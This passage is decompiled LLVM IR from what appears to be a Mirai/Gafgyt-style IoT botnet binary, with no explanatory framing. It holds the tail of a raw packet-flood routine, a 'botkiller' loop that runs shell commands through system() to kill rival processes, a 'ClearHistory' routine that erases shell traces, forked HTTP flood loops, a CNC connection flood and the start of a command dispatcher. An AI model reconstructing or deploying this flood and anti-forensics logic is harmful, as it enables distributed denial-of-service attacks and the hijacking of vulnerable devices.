  %v5_804e473 = icmp ult i32 %v0_804e473, 8
  store i1 %v5_804e473, i1* %cf.global-to-local, align 1
  %v6_804e476 = add i32 %v0_804e473, -12
  %v7_804e476 = inttoptr i32 %v6_804e476 to i32*
  store i32 %v1_804e0a3, i32* %v7_804e476, align 4
  %v5_804e479 = add i32 %v0_804e473, -16
  %v6_804e479 = inttoptr i32 %v5_804e479 to i32*
  store i32 %v2_804e08b, i32* %v6_804e479, align 4
  %v0_804e47c = call i32 @tcpcsum()
  %v1_804e47c = trunc i32 %v0_804e47c to i16
  %sext17 = mul i32 %v0_804e47c, 65536
  %v1_804e484 = sdiv i32 %sext17, 65536
  store i32 %v1_804e484, i32* %edx.global-to-local, align 4
  store i16 %v1_804e47c, i16* %v2_804e365, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v3_804e490 = load i16, i16* %v2_804e3c5, align 2
  %v4_804e490 = zext i16 %v3_804e490 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804e490, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e49f = load i32, i32* @esp, align 4
  %v2_804e49f = add i32 %v1_804e49f, -4
  %v3_804e49f = inttoptr i32 %v2_804e49f to i32*
  store i32 %v4_804e490, i32* %v3_804e49f, align 4
  %v0_804e4a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4a0 = add i32 %v1_804e49f, -8
  %v3_804e4a0 = inttoptr i32 %v2_804e4a0 to i32*
  store i32 %v0_804e4a0, i32* %v3_804e4a0, align 4
  %v1_804e4a1 = load i32, i32* %stack_var_-64, align 4
  %v2_804e4a1 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804e4a1 = call i32 @csum(i16* %v2_804e4a1, i32 %v1_804e4a1)
  %v4_804e4a1 = trunc i32 %v3_804e4a1 to i16
  %sext18 = mul i32 %v3_804e4a1, 65536
  %v1_804e4a9 = sdiv i32 %sext18, 65536
  store i32 %v1_804e4a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  store i16 %v4_804e4a1, i16* %v4_804e3e3, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804e4b5 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804e4b5, i1* %cf.global-to-local, align 1
  %v15_804e4b5 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804e4b8 = icmp eq i1 %v15_804e4b5, false
  br i1 %v1_804e4b8, label %dec_label_pc_804e4d8, label %dec_label_pc_804e4ba

dec_label_pc_804e4ba:                             ; preds = %dec_label_pc_804e403
  %v0_804e4ba = load i32, i32* @esp, align 4
  %v5_804e4ba = icmp ult i32 %v0_804e4ba, 12
  store i1 %v5_804e4ba, i1* %cf.global-to-local, align 1
  %v1_804e4bd = add i32 %v0_804e4ba, -16
  %v2_804e4bd = inttoptr i32 %v1_804e4bd to i32*
  store i32 0, i32* %v2_804e4bd, align 4
  %v1_804e4bf = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804e4bf = call i32 @__GI_time(i32* %v1_804e4bf)
  store i32 %v2_804e4bf, i32* %eax.global-to-local, align 4
  %v0_804e4c4 = load i32, i32* @esp, align 4
  %v1_804e4c4 = add i32 %v0_804e4c4, 16
  %v10_804e4c7 = icmp ult i32 %v2_804e4bf, %v5_804e3f4
  store i1 %v10_804e4c7, i1* %cf.global-to-local, align 1
  %v8_804e4ca = icmp sgt i32 %v2_804e4bf, %v5_804e3f4
  br i1 %v8_804e4ca, label %dec_label_pc_804e4e0, label %dec_label_pc_804e403

dec_label_pc_804e4d8:                             ; preds = %dec_label_pc_804e403
  %v4_804e4d8 = add i32 %stack_var_-68.0, 1
  %v0_804e409.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e403

dec_label_pc_804e4e0:                             ; preds = %dec_label_pc_804e4ba, %dec_label_pc_804df9f, %dec_label_pc_804e028, %dec_label_pc_804dfea
  %v0_804e4ea = phi i32 [ %v4_804dfac, %dec_label_pc_804df9f ], [ %v3_804e036, %dec_label_pc_804e028 ], [ %v3_804dff8, %dec_label_pc_804dfea ], [ %v2_804e4bf, %dec_label_pc_804e4ba ]
  store i32 %v0_804df5e, i32* @ebx, align 4
  store i32 %v0_804df5d, i32* @esi, align 4
  ret i32 %v0_804e4ea

; uselistorder directives
  uselistorder i32 %v2_804e4bf, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e462, { 1, 0 }
  uselistorder i32 %v1_804e447, { 1, 0 }
  uselistorder i32 %v0_804e432, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804e409, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804e3f4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804e3ec, { 1, 0 }
  uselistorder i32 %v1_804e3d6, { 1, 0 }
  uselistorder i32 %v1_804e388, { 1, 0 }
  uselistorder i32 %v1_804e359, { 1, 0 }
  uselistorder i32 %v3_804e33f, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804e314, { 1, 0 }
  uselistorder i1 %v0_804e2fb, { 1, 0 }
  uselistorder i32 %v6_804e2f9, { 1, 0 }
  uselistorder i32 %v1_804e2c1, { 1, 0 }
  uselistorder i1 %v0_804e2a8, { 1, 0 }
  uselistorder i32 %v6_804e2a6, { 1, 0 }
  uselistorder i32 %v1_804e26b, { 1, 0 }
  uselistorder i1 %v0_804e252, { 1, 0 }
  uselistorder i32 %v6_804e250, { 1, 0 }
  uselistorder i32 %v1_804e221, { 1, 0 }
  uselistorder i1 %v0_804e208, { 1, 0 }
  uselistorder i32 %v6_804e206, { 1, 0 }
  uselistorder i32 %v1_804e1dd, { 1, 0 }
  uselistorder i1 %v0_804e1c4, { 1, 0 }
  uselistorder i32 %v6_804e1c2, { 1, 0 }
  uselistorder i32 %v4_804e1a4, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804e324, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804e311, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804e17d, { 1, 0 }
  uselistorder i32 %v1_804e171, { 1, 0 }
  uselistorder i32 %v1_804e165, { 1, 0 }
  uselistorder i32 %v1_804e159, { 1, 0 }
  uselistorder i32 %v1_804e14d, { 1, 0 }
  uselistorder i8* %v2_804e14a, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e134, { 1, 0 }
  uselistorder i32 %v6_804e132, { 1, 0 }
  uselistorder i32 %v1_804e0e6, { 1, 0 }
  uselistorder i32 %v0_804e0c8, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804e0a3, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804e08b, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804e080, { 1, 0, 2 }
  uselistorder i32 %v2_804e061, { 1, 0 }
  uselistorder i32 %v1_804df8a, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cf.global-to-local, { 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 1, 2, 3, 4, 23, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 0, 2, 1 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 (i16*, i32)* @csum, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 3, 2, 1, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e4e0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e403, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e39d, { 1, 0 }
  uselistorder label %dec_label_pc_804e335, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e1a4, { 1, 0 }
  uselistorder label %dec_label_pc_804e068, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_804df9f, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804e4fd = ptrtoint i32* %stack_var_-88 to i32
  %v2_804e525 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804e4f1

dec_label_pc_804e4f1:                             ; preds = %dec_label_pc_804e5a0, %entry
  br label %dec_label_pc_804e4fd

dec_label_pc_804e4fd:                             ; preds = %dec_label_pc_804e4f1, %dec_label_pc_804e4fd
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804e4f1 ], [ %v4_804e593, %dec_label_pc_804e4fd ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804e516 = mul nuw nsw i32 %storemerge117, 4
  %v2_804e516 = add i32 %v1_804e516, ptrtoint ([87 x i8*]* @global_var_805b040.396 to i32)
  %v3_804e516 = inttoptr i32 %v2_804e516 to i32*
  %v4_804e516 = load i32, i32* %v3_804e516, align 4
  %v3_804e525 = call i32 @strcat(i8* %v2_804e525, i32 %v4_804e516)
  %v1_804e534 = call i32 @__libc_system(i32 %v2_804e4fd)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804e559 = load i32, i32* %v3_804e516, align 4
  %v3_804e568 = call i32 @strcat(i8* %v2_804e525, i32 %v4_804e559)
  %v3_804e57c = call i32 @strcat(i8* %v2_804e525, i32 ptrtoint (i32* @global_var_8058c39.397 to i32))
  %v1_804e58b = call i32 @__libc_system(i32 %v2_804e4fd)
  %v4_804e593 = add nuw nsw i32 %storemerge117, 1
  %exitcond = icmp eq i32 %v4_804e593, 9
  br i1 %exitcond, label %dec_label_pc_804e5a0, label %dec_label_pc_804e4fd

dec_label_pc_804e5a0:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e5a5 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804e4f1

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_80577bb.15, { 1, 0 }
  uselistorder label %dec_label_pc_804e4fd, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_804e5c0 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_8058c3b.398 to i32))
  %v2_804e5d0 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_8058c51.399 to i32))
  %v2_804e5e0 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_8058c6f.400 to i32))
  ret i32 %v2_804e5e0

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e5ee = load i32, i32* @esi, align 4
  %v0_804e5ef = load i32, i32* @ebx, align 4
  store i32 %v0_804e5ef, i32* %stack_var_-16, align 4
  %v2_804e600 = ptrtoint i32* %stack_var_-56 to i32
  %tmp36 = bitcast i32* %stack_var_-56 to i8*
  store i32 %v2_804e600, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_8058e5c.408 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e610 = call i8* @_memcpy(i8* %tmp36, i8* bitcast ([7 x i8*]* @global_var_8058e5c.408 to i8*), i32 7)
  %v2_804e62c = call i32 @__GI_time(i32* null)
  %v5_804e634 = add i32 %v2_804e62c, %arg5
  store i32 %v5_804e634, i32* @eax, align 4
  %v1_804e63a = call i32 @random()
  %v2_804e64a = ashr i32 %v1_804e63a, 31
  %v2_804e64d = zext i32 %v1_804e63a to i64
  %v4_804e64d = zext i32 %v2_804e64a to i64
  %v5_804e64d = mul nuw i64 %v4_804e64d, 4294967296
  %v6_804e64d = or i64 %v5_804e64d, %v2_804e64d
  %v10_804e64d = srem i64 %v6_804e64d, 7
  %v11_804e64d = trunc i64 %v10_804e64d to i32
  store i32 %v11_804e64d, i32* @eax, align 4
  %v0_804e651 = load i32, i32* @ebp, align 4
  %v2_804e651 = mul i32 %v11_804e64d, 4
  %v3_804e651 = add i32 %v0_804e651, -52
  %v4_804e651 = add i32 %v3_804e651, %v2_804e651
  %v5_804e651 = inttoptr i32 %v4_804e651 to i32*
  %v6_804e651 = load i32, i32* %v5_804e651, align 4
  store i32 %v6_804e651, i32* @ebx, align 4
  %v0_804e655 = call i32 @random()
  store i32 3, i32* @edi, align 4
  %v2_804e680 = ptrtoint i32* %stack_var_-580 to i32
  %v5_804e687 = call i32 @sprintf(i32 %v2_804e680, i32 ptrtoint ([62 x i8]* @global_var_8058e90.412 to i32), i32 %arg2, i32 %arg4)
  %v5_804e73846 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e73846, label %dec_label_pc_804e69b, label %dec_label_pc_804e73e

dec_label_pc_804e69b:                             ; preds = %entry, %dec_label_pc_804e72f
  %storemerge47 = phi i32 [ %v4_804e72f, %dec_label_pc_804e72f ], [ 0, %entry ]
  %v1_804e69b = call i32 @__libc_fork(i32 %storemerge47)
  %v1_804e6a0 = icmp eq i32 %v1_804e69b, 0
  br i1 %v1_804e6a0, label %dec_label_pc_804e72f, label %dec_label_pc_804e713.preheader

dec_label_pc_804e713.preheader:                   ; preds = %dec_label_pc_804e69b
  %v4_804e6e2 = bitcast i32* %stack_var_-580 to i8*
  %v2_804e71840 = call i32 @__GI_time(i32* null)
  %v5_804e72343 = icmp slt i32 %v2_804e71840, %v5_804e634
  br i1 %v5_804e72343, label %dec_label_pc_804e6aa.lr.ph, label %dec_label_pc_804e725

dec_label_pc_804e6aa.lr.ph:                       ; preds = %dec_label_pc_804e713.preheader
  br label %dec_label_pc_804e6aa

dec_label_pc_804e6aa:                             ; preds = %dec_label_pc_804e6aa.lr.ph, %dec_label_pc_804e713.backedge
  store i32 %arg1, i32* @edx, align 4
  %v3_804e6bd = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804e6c8 = icmp eq i32 %v3_804e6bd, 0
  br i1 %v4_804e6c8, label %dec_label_pc_804e713.backedge, label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %dec_label_pc_804e6aa
  store i1 false, i1* @df, align 1
  store i32 %v2_804e680, i32* @edi, align 4
  %v3_804e6e8 = call i32 @_strlen(i8* %v4_804e6e2)
  %v4_804e6fd = call i32 @__libc_write(i32 %v3_804e6bd, i32* nonnull %stack_var_-580, i32 %v3_804e6e8)
  %v1_804e70b = call i32 @__libc_close(i32 %v3_804e6bd)
  br label %dec_label_pc_804e713.backedge

dec_label_pc_804e713.backedge:                    ; preds = %dec_label_pc_804e6ce, %dec_label_pc_804e6aa
  %v2_804e718 = call i32 @__GI_time(i32* null)
  %v5_804e723 = icmp slt i32 %v2_804e718, %v5_804e634
  br i1 %v5_804e723, label %dec_label_pc_804e6aa, label %dec_label_pc_804e725

dec_label_pc_804e725:                             ; preds = %dec_label_pc_804e713.backedge, %dec_label_pc_804e713.preheader
  %v1_804e72a = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e72f:                             ; preds = %dec_label_pc_804e69b
  %v4_804e72f = add nuw nsw i32 %storemerge47, 1
  %v5_804e738 = icmp slt i32 %v4_804e72f, %arg6
  br i1 %v5_804e738, label %dec_label_pc_804e69b, label %dec_label_pc_804e73e

dec_label_pc_804e73e:                             ; preds = %dec_label_pc_804e72f, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e72f, %dec_label_pc_804e72f ]
  %v2_804e741 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e741, i32* @ebx, align 4
  store i32 %v0_804e5ee, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e72f, { 0, 2, 1 }
  uselistorder i32 %storemerge47, { 1, 0 }
  uselistorder i32 %v5_804e634, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804e6aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e69b, { 1, 0 }
}

define i32 @sendHTTP2(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-569 = alloca i32, align 4
  %stack_var_-568 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_804e749 = load i32, i32* @edi, align 4
  %v2_804e75b = ptrtoint i32* %stack_var_-56 to i32
  %tmp32 = bitcast i32* %stack_var_-56 to i8*
  store i32 %v2_804e75b, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_8058ed0.413 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e76b = call i8* @_memcpy(i8* %tmp32, i8* bitcast ([7 x i8*]* @global_var_8058ed0.413 to i8*), i32 7)
  %v2_804e772 = call i32 @__GI_time(i32* null)
  %v5_804e77a = add i32 %v2_804e772, %arg5
  %v2_804e7c0 = ptrtoint i32* %stack_var_-568 to i32
  %v4_804e815 = bitcast i32* %stack_var_-568 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804e88641 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e88641, label %dec_label_pc_804e793.lr.ph, label %dec_label_pc_804e88c

dec_label_pc_804e793.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e87d, %dec_label_pc_804e793.lr.ph
  %storemerge42 = phi i32 [ 0, %dec_label_pc_804e793.lr.ph ], [ %v4_804e87d, %dec_label_pc_804e87d ]
  %v0_804e793 = call i32 @random()
  %v5_804e7c7 = call i32 @sprintf(i32 %v2_804e7c0, i32 ptrtoint ([64 x i8]* @global_var_8058eec.414 to i32), i32 %arg1, i32 %arg4)
  %v1_804e7cf = call i32 @__libc_fork(i32 %v2_804e7c0)
  %v1_804e7d4 = icmp eq i32 %v1_804e7cf, 0
  br i1 %v1_804e7d4, label %dec_label_pc_804e87d, label %dec_label_pc_804e85d.preheader

dec_label_pc_804e85d.preheader:                   ; preds = %dec_label_pc_804e793
  %v2_804e86235 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e86235, i32* @eax, align 4
  %v5_804e86d38 = icmp slt i32 %v2_804e86235, %v5_804e77a
  br i1 %v5_804e86d38, label %dec_label_pc_804e7de, label %dec_label_pc_804e873

dec_label_pc_804e7de:                             ; preds = %dec_label_pc_804e85d.preheader, %dec_label_pc_804e85d.backedge
  %v3_804e7f0 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804e7fb = icmp eq i32 %v3_804e7f0, 0
  br i1 %v4_804e7fb, label %dec_label_pc_804e85d.backedge, label %dec_label_pc_804e801

dec_label_pc_804e801:                             ; preds = %dec_label_pc_804e7de
  store i1 false, i1* @df, align 1
  store i32 %v2_804e7c0, i32* @edi, align 4
  %v3_804e81b = call i32 @_strlen(i8* %v4_804e815)
  %v4_804e830 = call i32 @__libc_write(i32 %v3_804e7f0, i32* nonnull %stack_var_-568, i32 %v3_804e81b)
  %v4_804e847 = call i32 @__libc_read(i32 %v3_804e7f0, i32* nonnull %stack_var_-569, i32 1)
  %v1_804e855 = call i32 @__libc_close(i32 %v3_804e7f0)
  br label %dec_label_pc_804e85d.backedge

dec_label_pc_804e85d.backedge:                    ; preds = %dec_label_pc_804e801, %dec_label_pc_804e7de
  %v2_804e862 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e862, i32* @eax, align 4
  %v5_804e86d = icmp slt i32 %v2_804e862, %v5_804e77a
  br i1 %v5_804e86d, label %dec_label_pc_804e7de, label %dec_label_pc_804e873

dec_label_pc_804e873:                             ; preds = %dec_label_pc_804e85d.backedge, %dec_label_pc_804e85d.preheader
  %v1_804e878 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e87d

dec_label_pc_804e87d:                             ; preds = %dec_label_pc_804e793, %dec_label_pc_804e873
  %v4_804e87d = add nuw nsw i32 %storemerge42, 1
  store i32 %v4_804e87d, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804e87d, %arg6
  br i1 %exitcond, label %dec_label_pc_804e88c, label %dec_label_pc_804e793

dec_label_pc_804e88c:                             ; preds = %dec_label_pc_804e87d, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804e87d ]
  store i32 %v0_804e749, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v2_804e7c0, { 1, 0, 2 }
  uselistorder i32 %v5_804e77a, { 1, 0 }
  uselistorder label %dec_label_pc_804e87d, { 1, 0 }
  uselistorder label %dec_label_pc_804e7de, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_804e89e = call i32 @__GI_time(i32* null)
  %v5_804e8a6 = add i32 %v2_804e89e, %arg3
  %v1_804e8b3 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e8c7 = urem i32 %arg2, 65536
  %v1_804e8d0 = call i32 @htons(i32 %v1_804e8c7)
  %v2_804e8f2 = ptrtoint i32* %stack_var_-28 to i32
  %v2_804e92619 = call i32 @__GI_time(i32* null)
  %v5_804e93122 = icmp slt i32 %v2_804e92619, %v5_804e8a6
  br i1 %v5_804e93122, label %dec_label_pc_804e8de, label %dec_label_pc_804e933

dec_label_pc_804e8de:                             ; preds = %entry, %dec_label_pc_804e8de
  %v3_804e8e7 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804e8fe = call i32 @__libc_connect(i32 %v3_804e8e7, i32 %v2_804e8f2, i32 16)
  %v1_804e90b = call i32 @sleep(i32 1)
  %v1_804e919 = call i32 @__libc_close(i32 %v3_804e8e7)
  %v2_804e926 = call i32 @__GI_time(i32* null)
  %v5_804e931 = icmp slt i32 %v2_804e926, %v5_804e8a6
  br i1 %v5_804e931, label %dec_label_pc_804e8de, label %dec_label_pc_804e933

dec_label_pc_804e933:                             ; preds = %dec_label_pc_804e8de, %entry
  %v2_804e926.lcssa = phi i32 [ %v2_804e92619, %entry ], [ %v2_804e926, %dec_label_pc_804e8de ]
  ret i32 %v2_804e926.lcssa

; uselistorder directives
  uselistorder i32 %v5_804e8a6, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804e8de, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp188 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e938 = load i32, i32* @edi, align 4
  %v0_804e939 = load i32, i32* @esi, align 4
  %v0_804e93a = load i32, i32* @ebx, align 4
  store i32 %v0_804e93a, i32* %stack_var_-16, align 4
  %v5_804e93b = icmp ult i32* %stack_var_-16, inttoptr (i32 348 to i32*)
  store i1 %v5_804e93b, i1* %cf.global-to-local, align 1
  %v15_804e93b = ptrtoint i32* %stack_var_-364 to i32
  %v1_804e944 = inttoptr i32 %tmp188 to i32*
  %v2_804e944 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804e961 = inttoptr i32 %v2_804e944 to i8*
  store i32 %v2_804e944, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8057f37.21 to i32), i32* @edi, align 4
  %v7_804e973 = call i32 @_strncmp(i8* %v4_804e961, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057f37.21, i32 0, i32 0), i32 5)
  %v8_804e973 = urem i32 %v7_804e973, 2
  %v9_804e973 = icmp eq i32 %v8_804e973, 0
  %v0_804e975 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e975 = or i1 %v0_804e975, %v9_804e973
  %v3_804e975 = zext i1 %v2_804e975 to i32
  %v4_804e975 = load i32, i32* @edx, align 4
  %v5_804e975 = and i32 %v4_804e975, -256
  %v6_804e975 = or i32 %v3_804e975, %v5_804e975
  %v7_804e975 = xor i32 %v6_804e975, 1
  store i32 %v7_804e975, i32* %edx.global-to-local, align 4
  %v1_804e97d = trunc i32 %v7_804e975 to i8
  %v3_804e97d = zext i1 %v0_804e975 to i8
  %v15_804e97d = icmp eq i8 %v1_804e97d, %v3_804e97d
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e986 = icmp eq i1 %v15_804e97d, false
  br i1 %v1_804e986, label %dec_label_pc_804e9a3, label %dec_label_pc_804e988

dec_label_pc_804e988:                             ; preds = %entry
  %v0_804e988 = load i32, i32* @global_var_805b520.20, align 32
  %v0_804e98d = load i32, i32* @esp, align 4
  %v5_804e98d = icmp ult i32 %v0_804e98d, 8
  store i1 %v5_804e98d, i1* %cf.global-to-local, align 1
  store i32 %v0_804e988, i32* %stack_var_-380, align 4
  %v2_804e996 = call i32 @sockprintf(i32 %v0_804e988, i32 ptrtoint ([6 x i8]* @global_var_8058f2c.415 to i32))
  %v0_804e99b = load i32, i32* @esp, align 4
  %v2_804e99b = icmp ugt i32 %v0_804e99b, -17
  store i1 %v2_804e99b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804e9a3:                             ; preds = %entry
  %v2_804e9a6 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804e9c3 = inttoptr i32 %v2_804e9a6 to i8*
  store i32 %v2_804e9a6, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8058f32.416 to i32), i32* @edi, align 4
  %v7_804e9d5 = call i32 @_strncmp(i8* %v4_804e9c3, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058f32.416, i32 0, i32 0), i32 6)
  %v8_804e9d5 = urem i32 %v7_804e9d5, 2
  %v9_804e9d5 = icmp eq i32 %v8_804e9d5, 0
  %v0_804e9d7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9d7 = or i1 %v0_804e9d7, %v9_804e9d5
  %v3_804e9d7 = zext i1 %v2_804e9d7 to i32
  %v4_804e9d7 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9d7 = and i32 %v4_804e9d7, -256
  %v6_804e9d7 = or i32 %v3_804e9d7, %v5_804e9d7
  %v7_804e9d7 = xor i32 %v6_804e9d7, 1
  store i32 %v7_804e9d7, i32* %edx.global-to-local, align 4
  %v1_804e9df = trunc i32 %v7_804e9d7 to i8
  %v3_804e9df = zext i1 %v0_804e9d7 to i8
  %v15_804e9df = icmp eq i8 %v1_804e9df, %v3_804e9df
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9e8 = icmp eq i1 %v15_804e9df, false
